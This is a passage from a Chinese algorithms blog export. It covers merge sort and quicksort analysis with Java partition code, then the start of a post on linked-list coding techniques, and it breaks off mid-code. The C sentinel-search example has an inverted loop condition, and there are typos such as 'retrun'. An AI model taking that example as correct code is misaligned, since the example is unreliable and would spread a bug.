A[q+1…r])这个函数的作用就是，讲已经有序的A[p…q]和A[q+1…r]合并成另一个有序的数组，并且放入A[p…r]。那这个过程具体该怎么做呢？</p>\n<p>如图所示，我们申请一个临时数组temp，大小与A[p…r]相同。我们用两个指针i，j分别指向A[p…q]和A[q+1…r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。</p>\n<p>继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p…r]中。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的性能分析\"><a href=\"#归并排序的性能分析\" class=\"headerlink\" title=\"归并排序的性能分析\"></a>归并排序的性能分析</h3></div><br></div>\n\n<p>还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。</p>\n<p><strong>第一、 归并排序是稳定的排序算法吗？</strong></p>\n<p>结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。</p>\n<p>在合并的过程中，如果A[p…q]和A[q+1…r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p…q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。</p>\n<p><strong>第二、归并排序的时间复杂度是多少？</strong></p>\n<p>归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。</p>\n<p>在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。</p>\n<p>我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。</p>\n<p>从上面的分析，我们得出一个重要的结论：<strong>不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式</strong>。</p>\n<p>套用这个公式，我们来分析一下归并排序的时间复杂度。</p>\n<p>我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：<br>$$<br>\\begin{cases}<br>T(1) = C; &amp; n=1 \\\\[2ex]<br>T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程</p>\n<p>$$<br>\\begin{align*}<br>T(n) \\ &amp;= \\ 2*T(\\frac{n}{2}) \\ + \\ n \\\\[2ex]<br>&amp;= 2*(2 * T(\\frac{n}{4}) + \\frac{n}{2}) \\  + \\ n \\qquad = 4*T(\\frac{n}{4}) + 2*n \\\\[2ex]<br>&amp;= 4*(2* T(\\frac{n}{8}) + \\frac{n}{4}) \\  + \\ 2 * n \\ \\; = 8*T(\\frac{n}{8}) + 3*n \\\\[2ex]<br>&amp;= 8*(2* T(\\frac{n}{16}) + \\frac{n}{8}) \\  + \\ 3 * n \\ \\; = 16*T(\\frac{n}{16}) + 4*n \\\\[2ex]<br>&amp;= …… \\\\[2ex]<br>&amp;= 2^{k} * T(\\frac{n}{2^{k}}) + k * n<br>\\end{align*}<br>$$</p>\n<p>这样一步步推导，我们可以得到$T(n) \\ = \\ 2^{k} * T(\\frac{n}{2^{k}}) + k * n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\ = \\ Cn + n*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n*log_{2}n)$。所以归并排序的时间复杂度是$O(n*log_{2}n)$。</p>\n<p>从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n*log_{2}n)$。</p>\n<p><strong>第三、归并排序是不是原地排序算法呢？</strong></p>\n<p>归并排序的时间复杂度在任何情况下都是$O(n*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。</p>\n<p>这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n*log_{2}n)$，该如何分析呢？</p>\n<p>如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？</p>\n<p>实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的原理\"><a href=\"#快速排序的原理\" class=\"headerlink\" title=\"快速排序的原理\"></a>快速排序的原理</h3></div><br></div>\n\n<p>我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。</p>\n<p>快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。</p>\n<p>第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。</p>\n<p>根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。</p>\n<p>如果我们用递推公式来将上面的过程写出来的话，就是这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 递推公式</span><br><span class=\"line\">quick_sort(p...r) = quick_sort(p...q-<span class=\"number\">1</span>)+quick_sort(q+<span class=\"number\">1</span>...r)</span><br><span class=\"line\"></span><br><span class=\"line\"># 终止条件</span><br><span class=\"line\">p&gt;=r</span><br></pre></td></tr></table></figure>\n<p>我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n &lt; <span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    quickSort(arr, <span class=\"number\">0</span> , n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (left&gt;=right) <span class=\"keyword\">return</span>; </span><br><span class=\"line\">    <span class=\"keyword\">int</span> mid = partation(arr, left, right);</span><br><span class=\"line\">    quickSort(arr, left, mid-<span class=\"number\">1</span>);</span><br><span class=\"line\">    quickSort(arr, mid+<span class=\"number\">1</span>, right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> base = arr[left];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left, j = right;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;j)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[j] &gt;= base) j--;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[i] &lt;= base) i++;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i&lt;j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = arr[i];</span><br><span class=\"line\">            arr[i] = arr[j];</span><br><span class=\"line\">            arr[j] = temp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    arr[left] = arr[i];</span><br><span class=\"line\">    arr[i] = base;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation1</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot = a[right];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j=left; j&lt;=right-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[j]&lt;pivot)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = a[i];</span><br><span class=\"line\">            a[i] = a[j];</span><br><span class=\"line\">            a[j] = temp;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    a[right] = a[i];</span><br><span class=\"line\">    a[i] = pivot;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p…r]分区，函数返回pivot的小标。</p>\n<p>如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p…r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p…r]中。</p>\n<p>不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p…r]原地完成分区操作。</p>\n<p>原地分区函数的实现思路非常巧妙，我下面用伪代码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">partation(a,p,r)&#123;</span><br><span class=\"line\">    pivot := A[r]</span><br><span class=\"line\">    i := p;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j:=p to r-<span class=\"number\">1</span> <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> A[j] &lt; pivot&#123;</span><br><span class=\"line\">            swap A[i] with A[j]</span><br><span class=\"line\">            i := i+<span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    swap A[i] with A[r]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的处理有点类似于选择排序。我们通过游标i把A[p…r-1]分成了两部分，A[p…i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i…r-1] 是“未处理区间”。我们每次从未处理区间A[i…r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。</p>\n<p>数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。</p>\n<p>因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。</p>\n<p>到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？</p>\n<p>可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的性能分析\"><a href=\"#快速排序的性能分析\" class=\"headerlink\" title=\"快速排序的性能分析\"></a>快速排序的性能分析</h3></div><br></div>\n\n<p>现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。</p>\n<p>快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n*log_{2}n)$。</p>\n<p>$$<br>\\begin{cases} \\\\<br>\\ T(1) = C; &amp; n=1 \\\\[2ex]<br>\\ T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。</p>\n<p>我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n*log_{2}n)$退化成了$O(n^2)$。</p>\n<p>我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？</p>\n<p>实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。</p>\n<p>我们选择数组区间A[p…r]最后一个元素A[n-1]作为pivot，对数组A[0…n-1]进行原地分区，这样数组就分成了三部分，A[0…p-1]、A[p]、A[p+1…n-1]。</p>\n<p>如果p+1=K，那么A[p]就是要求解的元素，如果K&gt;p+1，说明第K大元素出现在A[p+1…n-1]区间内，我们再按照上面的思路在A[p+1…n-1]内查找。同理，如果K&lt; p+1，那我们就在A[0…p-1]区间内查找。</p>\n<p>我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？</p>\n<p>第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16……直到区间缩小为1.</p>\n<p>如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+……+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。</p>\n<p>归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。</p>\n<p>快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？</p>\n<p>多路归并、外排序</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-怎样写好链表代码","date":"2018-09-13T03:27:46.000Z","_content":"\n\n上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。\n\n为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？\n\n只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？\n\n当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。\n\n### 理解指针或引用的含义\n\n事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。\n\n有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。\n\n接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。\n\n实际上，对于指针的理解，只需要记住下面这句话就可以了：**将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量**。\n\n在编写链表代码的时候，经常会有这样的代码：p->next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p->next = p->next->next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。\n\n掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。\n\n### 警惕指针丢失和内存泄露\n\n不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。\n\n{% asset_img 链表插入.jpg %}\n\n如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。\n\n```C\np->next = c; // 将p的next指针指向c结点\nc->next = p->next; //将c结点next指针指向b结点\n```\n\n当p->next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c->next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。\n\n对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。\n\n### 利用哨兵简化实现难度\n\n首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。\n\n```C\nnew_node->next = p->next; \np->next = new_node; \n```\n\n但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。\n\n```C\nif (head == null)\n{\n\thead = new_node;\n}\n```\n\n同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：\n\n```C\np->next = p->next->next；\n```\n\n但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：\n\n```C\nif (head->next == null)\n{\n\thead = null;\n}\n```\n\n可以看出，**针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理**。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？\n\n这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。\n\n还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。\n\n如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做**带头链表**，相反，没有哨兵结点的链表叫做**不带头链表**。\n\n如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。\n\n{% asset_img 带头链表.jpg %}\n\n实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。\n\n代码一：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\n\tint i=0;\n\t// 这里有两个比较操作： i<n 和 a[i] == key\n\twhile(i<n){\n\t\tif(a[i] == key){\n\t\t\tretrun i;\n\t\t}\n\t\t++i;\n\t}\n\n\tretrun -1;\n}\n```\n\n代码二：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\n// 为了更好的解释，这里举了个例子来说明\n// a = {4,2,3,5,9,6} key = 7\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\t// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值\n\tif(a[n-1] == key){\n\t\treturn n-1;\n\t}\n\t// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6\n\tchar temp = a[n-1];\n\t// 把key值放到数组a[n-1]，此时a={4,2,3,5,9,7}\n\ta[n-1] = key;\n\n\tint i=0;\n\t// 此时while循环比起代码一，少了i<n这个比较操作\n\twhile(a[i] == key){\n\t\t++i;\n\t}\n\t// 将数组a[n-1] 恢复为原来的值\n\ta[n-1] = temp;\n\n\t// 如果i = n-1，说明数组中没有要找的key\n\tif(i == n-1){\n\t\treturn -1;\n\t}\n\t// 否则，说明找到了key，位置为i\n\telse{\n\t\treturn i;\n\t}\n}\n```\n\n对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。\n\n当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。\n\n### 重点留意边界条件处理\n\n软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。\n\n我经常用来检查链表代码是否正确执行的边界条件有这么几个：\n\n* 如果链表为空时，代码是否能正常工作？\n* 如果一个链表只包含了一个结点，代码能否正常工作？\n* 如果链表只包含两个结点时，代码能否正常工作？\n* 代码逻辑在处理头结点和尾结点时，是否能正常工作？\n\n当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。\n\n当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。\n\n其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。\n\n### 举列画图，辅助思考\n\n对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。\n\n你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：\n\n{% asset_img 举例.jpg%}\n\n看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。\n\n### 多写多练，没有捷径\n\n如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。\n\n下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。\n\n* 单链表反转\n* 链表中环的检测\n* 两个有序链表合并\n* 删除链表倒数第n个结点\n* 求链表的中间结点\n\n我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。\n\n```java\n/**\n * 链表的一些算法题目\n */\npublic class 